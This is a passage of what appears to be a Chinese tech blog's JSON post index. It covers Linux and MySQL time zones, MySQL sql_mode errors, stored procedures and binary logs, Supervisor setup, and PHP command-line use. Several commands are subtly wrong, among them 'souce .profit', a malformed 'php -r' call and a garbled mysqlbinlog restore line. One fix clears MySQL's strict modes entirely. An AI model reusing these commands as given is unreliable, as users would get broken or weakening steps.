clip&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板$ clip &lt; remade.txt","categories":[{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/categories/Shell/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"},{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"如何查看 Linux 默认时区","slug":"how-to-check-the-linux-default-time-zone","date":"2020-08-03T14:03:08.000Z","updated":"2020-08-25T02:19:08.477Z","comments":true,"path":"how-to-check-the-linux-default-time-zone/","link":"","permalink":"https://www.0x2beace.com/how-to-check-the-linux-default-time-zone/","excerpt":"最近遇到一个跟服务器时区相关的问题，没准备充分，当问题真正来临时，很懵。 特别是在生产环境中，系统时区是特别重要的存在，很多应用在默认情况下，都是取的系统时区，如果时区处理不得当的话，可能会造成不必要的困扰。","text":"最近遇到一个跟服务器时区相关的问题，没准备充分，当问题真正来临时，很懵。 特别是在生产环境中，系统时区是特别重要的存在，很多应用在默认情况下，都是取的系统时区，如果时区处理不得当的话，可能会造成不必要的困扰。 时区的概念关于时区，有以下几个标准： CST：北美中部标准时间 UTC：协调世界时，又称世界标准时间，简称UTC，从英文国际时间/法文协调时间”Universal Time/Temps Cordonné”而来。中国大陆、香港、澳门、台湾、蒙古国、新加坡、马来西亚、菲律宾、澳洲西部的时间与UTC的时差均为+8，也就是UTC+8。 GMT：格林尼治标准时间（旧译格林威治平均时间或格林威治标准时间；英语：Greenwich Mean Time，GMT）是指位于英国伦敦郊区的皇家格林尼治天文台的标准时间，因为本初子午线被定义在通过那里的经线。 Linux 的时间分为两种： 硬件时间：由 BIOS（或CMOS）所负责。 系统时间：由 Linux 所负责，系统时间在系统开关机后读取硬件时间后，再由 Linux 管理时间。 datedate命令是显示或设置系统时间与日期。 这个是最简单、最直观获取系统时间与日期的方式了。 12$ dateThu Jul 30 13:23:50 CST 2020 显示所在时区： 12date +&quot;%Z %z&quot;CST +0800 注意 + 和 &quot;之间没有空格，否则会报表。 date 命令常见参数： 12345678910111213141516171819202122232425%H 小时，24小时制（00~23）%I 小时，12小时制（01~12）%k 小时，24小时制（0~23）%l 小时，12小时制（1~12）%M 分钟（00~59）%p 显示出AM或PM%r 显示时间，12小时制（hh:mm:ss %p）%s 从1970年1月1日00:00:00到目前经历的秒数%S 显示秒（00~59）%T 显示时间，24小时制（hh:mm:ss）%X 显示时间的格式（%H:%M:%S）%Z 以字符串的形式显示时区，日期域（CST）%z 以数字的形式显示时区 (+0800)%a 星期的简称（Sun~Sat）%A 星期的全称（Sunday~Saturday）%h,%b 月的简称（Jan~Dec）%B 月的全称（January~December）%c 日期和时间（Tue Nov 20 14:12:58 2012）%d 一个月的第几天（01~31）%x,%D 日期（mm&#x2F;dd&#x2F;yy）%j 一年的第几天（001~366）%m 月份（01~12）%w 一个星期的第几天（0代表星期天）%W 一年的第几个星期（00~53，星期一为第一天）%y 年的最后两个数字（1999则是99） timedatectltimedatectl 命令非常的方便，当你不带任何参数运行它时，这条命令可以像下图一样，输出系统时间概览，其中包含当前时区： 123456789$ timedatectlLocal time: Thu 2020-07-30 05:30:21 UTC Universal time: Thu 2020-07-30 05:30:21 UTC RTC time: Thu 2020-07-30 05:30:21 Time zone: Etc&#x2F;UTC (UTC, +0000) System clock synchronized: yessystemd-timesyncd.service active: yes RTC in local TZ: no 只查看时区： 1$ timedatectl | grep &quot;Time zone&quot; /etc/timezone使用 cat 命令显示文件 /etc/timezone 的内容，来查看时区： 12$ cat &#x2F;etc&#x2F;timezoneEtc&#x2F;UTC 选择时区 1$ tzselect 选择完成之后，将时区相关的配置，写入.profit配置文件中。 然后使用 souce 命令，强制生效。 1souce .profit 参考链接 在 Linux 中查看时区 Linux date 命令 世界时钟地图","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Mysql only_full_group_by 异常记录","slug":"mysql-only-full-group-by-exception-record","date":"2020-07-31T12:17:14.000Z","updated":"2020-08-03T00:05:40.992Z","comments":true,"path":"mysql-only-full-group-by-exception-record/","link":"","permalink":"https://www.0x2beace.com/mysql-only-full-group-by-exception-record/","excerpt":"最近很频繁的遇到一个Mysql 异常，错误信息如下： 123Expression #5 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#39;cis.q1.query_date&#39; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode&#x3D;only_full_group_by","text":"最近很频繁的遇到一个Mysql 异常，错误信息如下： 123Expression #5 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#39;cis.q1.query_date&#39; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode&#x3D;only_full_group_by 通过错误信息可以看到，是因为 sql_mode 引起的。 查看Mysql 当前所使用的 sql_mode： 1234567select @@sql_mode+-------------------------+| @@sql_mode |+-------------------------+| ONLY_FULL_GROUP_BY |+-------------------------+ sql_mode 配置解析ONLY_FULL_GROUP_BY对于GROUP BY聚合操作，如果在SELECT中的列，没有在GROUP BY中出现，那么这个SQL是不合法的，因为列不在GROUP BY从句中。简而言之，就是SELECT后面接的列必须被GROUP BY后面接的列所包含。如： select a,b from table group by a,b,c; (正确) select a,b,c from table group by a,b; (错误) 这个配置会使得GROUP BY语句环境变得十分狭窄，所以一般都不加这个配置 NO_AUTO_VALUE_ON_ZERO该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。（不信的可以试试，默认的sql_mode你在自增主键列设置为0，该字段会自动变为最新的自增值，效果和null一样），如果用户希望插入的值为0（不改变），该列又是自增长的，那么这个选项就有用了。 STRICT_TRANS_TABLES在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制。（InnoDB默认事务表，MyISAM默认非事务表；MySQL事务表支持将批处理当做一个完整的任务统一提交或回滚，即对包含在事务中的多条语句要么全执行，要么全部不执行。非事务表则不支持此种操作，批处理中的语句如果遇到错误，在错误前的语句执行成功，之后的则不执行；MySQL事务表有表锁与行锁非事务表则只有表锁） NO_ZERO_IN_DATE在严格模式下，不允许日期和月份为零 NO_ZERO_DATE设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告。 ERROR_FOR_DIVISION_BY_ZERO在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如 果未给出该模式，那么数据被零除时MySQL返回NULL NO_AUTO_CREATE_USER禁止GRANT创建密码为空的用户 NO_ENGINE_SUBSTITUTION如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常 PIPES_AS_CONCAT将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似 ANSI_QUOTES启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符 解决方案编辑my.cnf配置文件，将 ONLY_FULL_GROUP_BY 去掉。 12[mysqld]sql_mode &#x3D; &quot;&quot; 然后重启Mysql 服务即可。 参考链接 记一次Group by 查询时的ONLY_FULL_GROUP_BY错误以及后续","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Supervisor 快速上手","slug":"supervisor-quick-start","date":"2020-07-30T12:38:38.000Z","updated":"2020-09-04T13:54:06.076Z","comments":true,"path":"supervisor-quick-start/","link":"","permalink":"https://www.0x2beace.com/supervisor-quick-start/","excerpt":"supervisord 是一个用 Python 写的进程管理工具，是类Unix系统中的一个进程管理工具， Supervisor 只适用于类Unix 系统，不适用于Window。","text":"supervisord 是一个用 Python 写的进程管理工具，是类Unix系统中的一个进程管理工具， Supervisor 只适用于类Unix 系统，不适用于Window。 安装因为Supervisor 是用 Python 所写的，所以可以直接使用pip 安装： 1sudo pip install supervisor Ubuntu： 1apt-get install supervisor Mac： 1brew install supervisor 配置Supervisor运行时会启动一个进程——supervisord 。 supervisord：它负责启动所管理的进程，并将所管理的进程作为自己的子进程来启动，而且可以在所管理的进程出现崩溃时自动重启。 supervisorctl：是命令行管理工具，可以用来执行 stop、start、restart 等命令，来对这些子进程进行管理。 查看默认配置项 1$ echo_supervisord_conf 将默认配置项重定向至配置文件： 1$ echo_supervisord_conf &gt; &#x2F;etc&#x2F;supervisord.conf 然后可以看到 /etc/ 配置文件下出现了以下文件，其中/etc/supervisor 是我们需要的配置文件。 1234$ find &#x2F;etc&#x2F; -name supervisor&#x2F;etc&#x2F;default&#x2F;supervisor&#x2F;etc&#x2F;init.d&#x2F;supervisor&#x2F;etc&#x2F;supervisor /etc/supervisord.conf 核心配置文件，参考以下部分配置，; 表示注释。 因为Supervisor默认配置会把socket文件和pid守护进程生成在/tmp/目录下，/tmp/目录是缓存目录，所以我们需要手动换成/var/run目录。 12345678910111213141516171819202122232425262728293031323334353637[unix_http_server];file&#x3D;&#x2F;tmp&#x2F;supervisor.sock ; UNIX socket 文件，supervisorctl 会使用file&#x3D;&#x2F;var&#x2F;run&#x2F;supervisor.sock ; 修改为 &#x2F;var&#x2F;run 目录，避免被系统删除;chmod&#x3D;0700 ; socket 文件的 mode，默认是 0700;chown&#x3D;nobody:nogroup ; socket 文件的 owner，格式： uid:gid;[inet_http_server] ; HTTP 服务器，提供 web 管理界面;port&#x3D;127.0.0.1:9001 ; Web 管理后台运行的 IP 和端口，如果开放到公网，需要注意安全性;username&#x3D;user ; 登录管理后台的用户名;password&#x3D;123 ; 登录管理后台的密码[supervisord];logfile&#x3D;&#x2F;tmp&#x2F;supervisord.log ; 日志文件，默认是 $CWD&#x2F;supervisord.loglogfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;supervisord.log ; 修改为 &#x2F;var&#x2F;log 目录，避免被系统删除logfile_maxbytes&#x3D;50MB ; 日志文件大小，超出会 rotate，默认 50MBlogfile_backups&#x3D;10 ; 日志文件保留备份数量默认 10loglevel&#x3D;info ; 日志级别，默认 info，其它: debug,warn,trace;pidfile&#x3D;&#x2F;tmp&#x2F;supervisord.pid ; pid 文件pidfile&#x3D;&#x2F;var&#x2F;run&#x2F;supervisord.pid ; 修改为 &#x2F;var&#x2F;run 目录，避免被系统删除nodaemon&#x3D;false ; 是否在前台启动，默认是 false，即以 daemon 的方式启动minfds&#x3D;1024 ; 可以打开的文件描述符的最小值，默认 1024minprocs&#x3D;200 ; 可以打开的进程数的最小值，默认 200; the below section must remain in the config file for RPC; (supervisorctl&#x2F;web interface) to work, additional interfaces may be; added by defining them in separate rpcinterface: sections[rpcinterface:supervisor]supervisor.rpcinterface_factory &#x3D; supervisor.rpcinterface:make_main_rpcinterface[supervisorctl];serverurl&#x3D;unix:&#x2F;&#x2F;&#x2F;tmp&#x2F;supervisor.sock ; 通过 UNIX socket 连接 supervisord，路径与 unix_http_server 部分的 file 一致serverurl&#x3D;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;supervisor.sock ; 修改为 &#x2F;var&#x2F;run 目录，避免被系统删除;serverurl&#x3D;http:&#x2F;&#x2F;127.0.0.1:9001 ; 通过 HTTP 的方式连接 supervisord; 包含其他的配置文件[include]files &#x3D; relative&#x2F;directory&#x2F;*.ini ; 可以是 *.conf 或 *.ini /etc/supervisor/conf.d 则是用来配置管理进程的配置文件，所有需要被supervisor 管理的进程都需要在这里先配置。 123456789101112131415[program:demo]command&#x3D;php demo.php &#x2F;&#x2F; 需要执行队列的名称directory&#x3D; &#x2F;var&#x2F;www &#x2F;&#x2F; 命令执行的目录或者说执行 command 之前，先切换到工作目录 可以理解为在执行命令前会切换到这个目录 process_name&#x3D;%(process_num)02d &#x2F;&#x2F; 默认为 %(program_name)s，即 [program:x] 中的 x这个是进程名，如果下面的numprocs参数为1的话，就不用管这个参数了，它默认值%(program_name)s也就是上面的那个program冒号后面的numprocs&#x3D;1 &#x2F;&#x2F; 进程数量当不为1时的时候，就是进程池的概念，注意process_name的设置autostart&#x3D;true &#x2F;&#x2F; 是否自动启动autorestart&#x3D;true &#x2F;&#x2F; 程序意外退出是否自动重启startsecs&#x3D;1 &#x2F;&#x2F; 自动重启间隔 startretries&#x3D;20 &#x2F;&#x2F; 当进程启动失败后，最大尝试启动的次数。。当超过3次后，supervisor将把此进程的状态置为FAIL 默认值为3redirect_stderr&#x3D;true &#x2F;&#x2F; 如果为true，则stderr的日志会被写入stdout日志文件中 理解为重定向输出的日志user&#x3D;root &#x2F;&#x2F; 这个参数可以设置一个非root用户，当我们以root用户启动supervisord之后。我这里面设置的这个用户，也可以对supervisord进行管理 stopsignal&#x3D;INTstderr_logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;demo.err.log &#x2F;&#x2F; 子进程的stdout的日志路径 输出日志文件stdout_logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;demo.out.log &#x2F;&#x2F; 错误日志文件 当redirect_stderr&#x3D;true。这个就不用 启动1$ supervisord -c &#x2F;etc&#x2F;supervisord.conf 常用命令整理停止进程，program_name 为 [program:x] 里的 x 1supervisorctl stop program_name 启动进程 1supervisorctl start program_name 重启进程 1supervisorctl restart program_name 结束所有属于名为 groupworker 这个分组的进程 (start，restart 同理) 1supervisorctl stop groupworker: 结束 groupworker:name1 这个进程 (start，restart 同理) 1supervisorctl stop groupworker:name1 停止全部进程，注：start、restart、stop 都不会载入最新的配置文件 1supervisorctl stop all 载入最新的配置文件，停止原有进程并按新的配置启动、管理所有进程 1supervisorctl reload 根据最新的配置文件，启动新配置或有改动的进程，配置没有改动的进程不会受影响而重启 1supervisorctl update 常见问题unlinking stale socket /var/run/supervisor.sock1234$ find &#x2F; -name supervisor.sock&#x2F;run&#x2F;supervisor.sock$ unlink &#x2F;run&#x2F;supervisor.sock 参考链接 “unix:///tmp/supervisor.sock no such file” 错误处理 https://segmentfault.com/a/1190000015768529 使用 supervisor 管理进程 Python 进程管理工具 Supervisor 使用教程","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Tutorial","slug":"PHP/Tutorial","permalink":"https://www.0x2beace.com/categories/PHP/Tutorial/"},{"name":"进程管理","slug":"PHP/Tutorial/进程管理","permalink":"https://www.0x2beace.com/categories/PHP/Tutorial/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"进程管理","slug":"进程管理","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"name":"Supervisor","slug":"Supervisor","permalink":"https://www.0x2beace.com/tags/Supervisor/"}]},{"title":"在 Linux 命令行中执行和使用 PHP 代码","slug":"execute-and-use-php-code-on-the-linux-command-line","date":"2020-07-29T00:08:12.000Z","updated":"2020-11-27T03:05:13.069Z","comments":true,"path":"execute-and-use-php-code-on-the-linux-command-line/","link":"","permalink":"https://www.0x2beace.com/execute-and-use-php-code-on-the-linux-command-line/","excerpt":"众所周知，PHP是一门脚本语言，主要用于服务端（JavaScript 用于客户端）以通过HTTP 生成动态网页。","text":"众所周知，PHP是一门脚本语言，主要用于服务端（JavaScript 用于客户端）以通过HTTP 生成动态网页。 所以与其他脚本语言一样，可以直接在终端中不需要网页浏览器来运行PHP 代码。 获取安装信息在安装完PHP 以及Nginx 之后，接下来我们通常需要做的是，在/usr/local/var/www (Mac 上的Nginx 工作目录)上创建一个内容为&lt;?php phpinfo(); ?&gt;，名为index.php的文件来测试PHP 是否安装正确。 执行以下命令即可： 1# echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; &#x2F;usr&#x2F;local&#x2F;var&#x2F;www&#x2F;index.php 然后，使用浏览器访问http://127.0.0.1/index.php，不出意外可以看到： 如何在终端中直接查看该信息？ 1# php -f &#x2F;usr&#x2F;local&#x2F;var&#x2F;www&#x2F;index.php | less 如果你觉得上面这种方式太麻烦了，那么还有一种更简便的方式可以达到同样的效果。 1# php -r &#39;php phpinfo();&#39; | less 交互模式有时候我们会遇到这样一种情况，想测试一小段代码，看看其运行结果，但是又不想重新创建一个文件，太麻烦了。 如果这个时候有一个地方可以直接运行这段代码且输出结果，那该多好啊。 PHP 为我们提供了两种交互模式，前者是自动的，后者是手动的。 Interactive shell Interactive mode enabled 两种模式都是使用 php -a 命令进入。 Interactive shell使用这个交互式shell，你可以直接在命令行窗口里输入PHP并直接获得输出结果。 1234567$ php -aInteractive shellphp &gt;echo &quot;Hello PHP&quot;;Hello PHPphp &gt; echo 10+90;100 回车即可查看输出内容。 Interactive mode enabled1234$ php -aInteractive mode enabledphp &gt;echo &quot;Hello PHP&quot;; 如果出现的是这个模式，说明你的PHP并不支持交互式shell， 不过不用担心，这个模式同样也可以执行PHP 代码，只是代码的执行方式有些区别。 输入了所有PHP代码后，输入Ctrl-Z（windows里），或输入Ctrl-D（linux里），你输入的所有代码将会一次执行完成并输出结果。 输入exit或者⌃ + c 退出交互模式。 PHP 脚本在终端中可以把PHP 脚本作为Shell 脚本来运行。 首先你需要创建一个PHP 脚本文件： 1# echo -e &#39;#!&#x2F;usr&#x2F;bin&#x2F;php\\n&lt;?php phpinfo();?&gt;&#39; &gt; phpscript.php -e 表示激活转义字符。 注意，这个脚本文件中的第一行#!/usr/bin/php，就像是Shell 脚本中的#!/bin/bash。目的是告诉Linux 命令行使用PHP 解析器来解析该文件。 运行该脚本： 12# chmod +x phpscript.php &#x2F;&#x2F; 使脚本具有执行权限# .&#x2F;phpscript.php &#x2F;&#x2F;执行脚本 PHP 服务PHP 有内置一个WebServer，可以很方便快速的搭建一个PHP 服务。 1$ php -t &#x2F;project to path -S localhost:port 然后通过浏览器访问localhost:port 就可以了。 总结 php -a：进入交互模式 php -f：解析和执行文件 php -h：获取帮助 php -i：查看PHP 信息和配置 php -m：显示已经安装的模块 php -r：运行PHP代码不使用脚本标签’‘ php -v：查看PHP 版本 php -ini：查看加载配置文件（php.ini、conf.d） php -i | grep configure：查看静态编译模块 php --ri swoole：查看指定模块的配置 locate php.ini：查询本地配置文件 time php script.php：查看程序的执行时间 参考链接 在 Linux 命令行中执行和使用 PHP 代码 12 个 Linux 终端中有用的 PHP 命令行用法","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"如何解决“ORDER BY子句不在SELECT列表中”的问题","slug":"list-causes-mysql-5-7-with-select-distinct-and-order-by","date":"2020-07-28T00:29:37.000Z","updated":"2020-07-28T15:28:10.444Z","comments":true,"path":"list-causes-mysql-5-7-with-select-distinct-and-order-by/","link":"","permalink":"https://www.0x2beace.com/list-causes-mysql-5-7-with-select-distinct-and-order-by/","excerpt":"记录一个最近遇到的Mysql 问题。","text":"记录一个最近遇到的Mysql 问题。 问题描述：在本地项目中，部分SQL 语句执行起来，总是会报一个错。而同样的SQL，在线上的服务器中执行起来没有任何问题。 错误提示内容： 1Expression #2 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#39;foodorder.orderlist.cname&#39; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode&#x3D;only_full_group_by QMYSQL: Unable to execute query 我的第一反应就是检查Mysql 的版本，很巧的是本地Mysql的版本确实比服务器的版本低一些。很快我就想到一定是版本存在差异性，导致语法不兼容。 升级Mysql既然是版本不一的问题，那就升级本地的Mysql 好了。 因为我的Mysql 是之前通过Homebrew 安装的，所以如需要升级，根本不用我自己手动去寻找安装包，直接通过Homebrew 的Upgrade 命令自动升级就好了。 起初我还担心自动升级会不会把我的Mysql 的版本更新的5.7以上，后来证明是我想多了。 不过在正式更新之前需要做好以下几件事情： 对数据库做好必要的备份 停止本地Mysql 服务 确定所要更新的Mysql 版本 做好以上三件事之后，就可以开始升级了。 1234$ brew search mysqlmysql@5.7 ✔$ brew upgrade mysql@5.7... 终于安装好之后，再次开启Mysql 的服务，我发现还是没有解决我的问题，还是会提示相同的错误。 这时候我才意识到这个问题和Mysql 的版本没有关系，有关系应该是相关的模块。 通过查阅一番资料，才发现是因为 group by 中的列一定要出现在 select 中，除非强制 sqlmode 中使用 ONLY_FULL_GROUP_BY。 开启sql-mode 模式123456789$ vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;my.cnf# 增加如下内容[mysqld]sql_mode&#x3D;&#39;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&#39;;# 或者[mysqld]sql_mode &#x3D; &quot;&quot; 重启Mysql 服务器，即可。 参考链接 如何解决 MySQL 5.7带有SELECT DISTINCT和ORDER BY的问题 | stack voerflow Mysql 服务器SQL 模式","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mysql 存储过程入门","slug":"getting-started-with-mysql-stored-procedures","date":"2020-07-27T15:50:50.000Z","updated":"2020-07-27T15:51:55.775Z","comments":true,"path":"getting-started-with-mysql-stored-procedures/","link":"","permalink":"https://www.0x2beace.com/getting-started-with-mysql-stored-procedures/","excerpt":"最近面临一个需求，需要使用Mysql 写一段存储过程，对数据库中的数据表做批量操作。 应该算是知识盲区了，花了一些时间去学习如何写好一个存储过程，最终也顺利写出来了，记录一下。","text":"最近面临一个需求，需要使用Mysql 写一段存储过程，对数据库中的数据表做批量操作。 应该算是知识盲区了，花了一些时间去学习如何写好一个存储过程，最终也顺利写出来了，记录一下。 以下两点是其中比较重要的部分： 关于变量的使用 在存储过程中使用动态SQL 语句 存储过程中的变量MySQL存储过程常见的变量：局部变量、用户变量、系统变量。 局部变量在过程体中，可以声明局部变量，用来临时保存一些值。 1DECLARE var_name[, var_name] ... type [DEFAULT value]; 其中，type为MySQL的数据类型，如:int、float、date、varchar(length) 。 使用局部变量时，需要注意以下两点： DECLARE用来声明局部变量，且DECLARE仅被用在BEGIN … END复合语句里，并且必须在复合语句的开头，在任何其它语句之前；可以被用在嵌套的块中，除了那些用相同名字声明变量的块。 如果要给变量提供一个默认值，使用DEFAULT子句(值可以是常数，也可以指定为一个表达式)；如果没有DEFAULT子句，初始值为NULL。 用户变量用户变量与数据库连接有关：在当前连接中声明的变量，在连接断开的时候，就会消失；在此连接中声明的变量无法在另一连接中使用。 用户变量使用@关键字去定义。 在存储过程中动态执行SQL其实这个理解成一套模版，只要按照标准去执行这套模版，就可以了。 1234567891011121314151617181920212223242526272829303132333435-- 连接数据库use databaseName;-- 定义结束符为 $$delimiter $$-- 判断是否存在该名称的存储过程，如果存在就删除drop procedure if exists wk;-- 创建新的存储过程create procedure wk()begin -- 声明变量 declare days int default 366; declare dates int;-- 循环体WHILE days - 1 &gt; 0 DO -- 为变量赋值 SET dates &#x3D; DATE_FORMAT(DATE_SUB(CURDATE(), INTERVAL dayofyear(now())- days DAY), &quot;%Y%m%d&quot;); SET days &#x3D; days - 1; -- 拼接表名 set @table_name &#x3D; CONCAT(&quot;tableName&quot;, dates); -- 拼接需要执行SQL 语句，后面的内容需要根据实际情况替换掉 SET @sql &#x3D; CONCAT(&quot;ALTER TABLE &quot;, @table_name, &quot; -- 需要执行的SQL &quot;); -- 预处理动态SQL 语句，其中stmt 是一个变量 PREPARE stmt FROM @sql; -- 执行SQL 语句 EXECUTE stmt ; -- 释放prepare deallocate prepare stmt;-- 结束循环end WHILE;-- 结束定义语句end $$delimiter ;call wk(); 大致上就是这样，至此，一个完整的Mysql 存储过程就完成了。 如何在终端执行Mysql 文件？ SQL 脚本准备好了，有两种方式可以执行它。 方式一：不进入Mysql 终端，直接在命令行终端执行 方式二：进入Mysql 终端，在Mysql 终端中执行 这两种方式的共同点就是都需要已知Mysql 密码。 对于方式一，可以使用以下命令来执行： 1mysql -u root -p &lt; .&#x2F;modify_user_table.sql 可以指定数据库： 1mysql -u root -p databaseName &lt; .&#x2F;modify_user_table.sql 对于方式二，可以使用以下命令来执行： 12345&#x2F;&#x2F; 进入Mysql 终端mysql -uroot -p &#x2F;&#x2F; 执行SQL 文件source .&#x2F;modify_user_table.sql 参考链接 Mysql 终端执行SQL 文件 Mysql 存储过程中的变量定义 Mysql 中的变量定义和赋值 Mysql 存储过程中使用动态SQL 语句","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mysql 查看修改默认时区","slug":"mysql-view-and-modify-the-default-time-zone","date":"2020-07-25T15:43:57.000Z","updated":"2020-07-25T15:45:03.233Z","comments":true,"path":"mysql-view-and-modify-the-default-time-zone/","link":"","permalink":"https://www.0x2beace.com/mysql-view-and-modify-the-default-time-zone/","excerpt":"在之前的笔记中，我们知道了时区相关的概念，以及如何在PHP 获取设置默认时区。 这篇笔记就来学习一下如何在Mysql 上获取设置默认时区。","text":"在之前的笔记中，我们知道了时区相关的概念，以及如何在PHP 获取设置默认时区。 这篇笔记就来学习一下如何在Mysql 上获取设置默认时区。 查看默认时区12345678mysql&gt; show variables like &quot;%time_zone%&quot;;+------------------+--------+| Variable_name | Value |+------------------+--------+| system_time_zone | CST || time_zone | SYSTEM |+------------------+--------+2 rows in set (0.01 sec) 设置默认时区设置当前会话12mysql&gt; SET time_zone &#x3D; &quot;+8.00&quot;;mysql&gt; show variables like &quot;%time_zone%&quot;; 此修改只会对当前会话有效。 全局设置1mysql&gt; SET global time_zone &#x3D; &quot;+8.00&quot;; 需要重启该会话，该配置才生效。 编辑 my.ini123# 打开Mysql 的配置文件 my.ini[mysqld]default-time_zone &#x3D; &#39;+8:00&#39; 需要重启Mysql 服务 时间格式GMT（Greenwich Mean Time）：格林威治标准时间UTC：世界标准时间CST（China Standard Time）：中国标准时间 GMT + 8 = UTC + 8 = CST 参考链接 Mysql 查看修改时区 time_zone","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"了解 Mysql 日志","slug":"understanding-the-mysql-log","date":"2020-07-25T15:38:53.000Z","updated":"2020-07-31T12:39:49.199Z","comments":true,"path":"understanding-the-mysql-log/","link":"","permalink":"https://www.0x2beace.com/understanding-the-mysql-log/","excerpt":"日志无论在哪里都是尤为重要的存在，所以这篇笔记的目的就是了解Mysql 日志的。","text":"日志无论在哪里都是尤为重要的存在，所以这篇笔记的目的就是了解Mysql 日志的。 日志简介Mysql 的日志主要分为四类，使用这些日志文件，可以查看Mysql 内部发生的事情，这四类日志分别是： 错误日志：记录Mysql 服务的启动、运行或停止Mysql服务时出现的问题。 查询日志：记录建立的客户端连接和执行的语句。 二进制日志：记录所有更改数据的语句，可以用于数据恢复。 慢查询日志：记录所有执行时间超过 long_query_time 的所有查询或不使用索引的查询。 二进制日志二进制日志主要记录 Mysql 数据库的变化。二进制日志以一种有效的格式，并且是事务安全的方式包含更新日志中可用的所有信息。 启动和设置二进制日志默认情况下，二进制日志是关闭的，可以通过修改mysql 的配置文件来启动和设置二进制日志。 配置文件 my.ini 中有几个设置是关于二进制日志的： 1234567# 如果需要启用，就在 mysqld 组下，加上 log-bin 选项[mysqld]log-binlog-bin [&#x3D;path&#x2F; [filename] ]expire_logs_days &#x3D; 10max_binlog_size &#x3D; 100M log-bin定义开启二进制日志，path 表示日志文件所在的目录路径，filename 指定了日志文件的名称。 expire_logs_days定义了Mysql 清除过期日志的时间，即二进制日至的自动删除的天数。 max_binlog_size定义了单个文件的大小限制，不能将变量设置为大于1GB或者小于4096B。默认值为1GB. 如何检查自己的二进制日志是否开启了呢？ 输入以下命令： 1mysql&gt; show variables like &#39;log_%&#39;; 查看二进制日志查看二进制文件个数及文件名，前提是开启了二进制日志： 1mysql&gt; show binary logs; 删除二进制日志Mysql 也为我们提供了删除二进制日志的方法，有两种，作用不相同。 删除所有二进制日志文件： 1mysql&gt; RESET MASTER; 删除指定二进制日志文件： 12# 其中，binlog.000003 是指二进制文件的名称mysql&gt; PURGE MASTER LOGS TO &quot;binlog.000003&quot;; 使用二进制日志恢复数据库如果启用了Mysql 的二进制日志，在数据库出现意外丢失数据时，可以使用 Mysqlbinlog 工具从指定时间点开始（例如，最后一次备份）直到现在。 Mysqlbinlog 恢复数据库的语法如下： 1mysql&gt; mysqlbinlog [option] filename | mysql -uuser -ppass 实例：使用Mysqlbinlog 恢复Mysql 数据库到2019年1月30日15:27:48时的状态，执行如下命令： 1mysqlbinlog --stop--date&#x3D;&quot;2019-01-30 15:27:48&quot; | path&#x2F;binlogfilename -uuser -ppass 暂停二进制日志功能因为修改Mysql 配置文件可以启用、停用二进制日志功能，但是需要重启Mysql 服务器。Mysql 为我们提供了一种更简单的方式可以暂停记录二进制日志。 暂停记录二进制日志： 1mysql&gt; SET sql_log_bin &#x3D; 0; 恢复记录二进制日志： 1mysql&gt; SET sql_log_bin &#x3D; 1; 错误日志错误日志文件包含了当Mysqld 